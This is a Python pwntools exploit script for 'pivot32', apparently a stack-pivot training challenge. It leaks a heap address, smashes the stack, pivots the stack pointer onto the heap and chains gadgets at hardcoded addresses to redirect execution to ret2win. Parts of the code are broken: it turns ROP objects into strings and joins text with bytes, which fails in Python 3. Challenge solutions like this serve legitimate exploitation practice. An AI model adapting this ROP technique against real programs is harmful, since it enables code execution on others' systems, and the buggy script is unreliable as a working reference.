#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template pivot32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('pivot32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'

context.clear(arch='i386')
filename = './pivot32'
libpivot = './libpivot32.so'

elf = ELF(filename)
lib = ELF(libpivot)
io = process(filename)


io.recvuntil("pivot: ")
heap_address= int(io.recvline().decode('UTF-8').split(' ')[-1], 16)
log.info("Heap: " +hex(heap_address))

foothold_call  = p32(elf.plt.foothold_function) # .plt location of foothold_function 
foothold_reloc = p32(elf.got.foothold_function) # .got.plt location adress pointer to foothold_function

r2w_offset = p32(lib.sym.ret2win - lib.sym.foothold_function)

#usefulGadgets heap
load_eax       = p32(0x08048830) # : mov eax, dword ptr [eax] ; ret
add_eax_ebx    = p32(0x08048833) # : add eax, ebx ; ret
#init+33
pop_ebx        = p32(0x080484a9) # : pop ebx ; ret
#deregister_tm_clones+32
call_eax       = p32(0x080485f0) # : call eax

#usefulGadgets 
pop_eax      = p32(0x0804882c) # : pop eax ; ret
#usefulGadgets+2
xchg_eax_esp = p32(0x0804882e) # : xchg eax, esp ; ret


def smash_stack():
    smash = ROP(elf)
    smash.raw(pop_eax)
    smash.raw(heap_address)
    smash.raw(xchg_eax_esp)
    return str(smash.chain())

def buffer_heap():
    bufferHeap = ROP(elf)
    bufferHeap.raw(foothold_call)
    bufferHeap.raw(pop_eax)
    bufferHeap.raw(foothold_reloc)
    
    bufferHeap.raw(load_eax)
    bufferHeap.raw(pop_ebx)
    bufferHeap.raw(r2w_offset)
    bufferHeap.raw(add_eax_ebx)
    bufferHeap.raw(call_eax)    
    
    bufferHeap = str(bufferHeap)+ b'B'*(255-len(str(bufferHeap)))
    
    return bufferHeap

def send_lines(heap_buffer, stack_smash):
    io.sendline(heap_buffer)
    io.sendline(stack_smash)
    data=io.recvall()
    print(data.decode())
    

payload_smash = "B"*44
payload_smash += smash_stack()

payload_buff_heap = ""
payload_buff_heap += buffer_heap()

print("length of payload_smash: "+str(len(payload_smash)))
print("length of payload_buff_heap: "+str(len(payload_buff_heap)))

send_lines(payload_buff_heap,payload_smash)
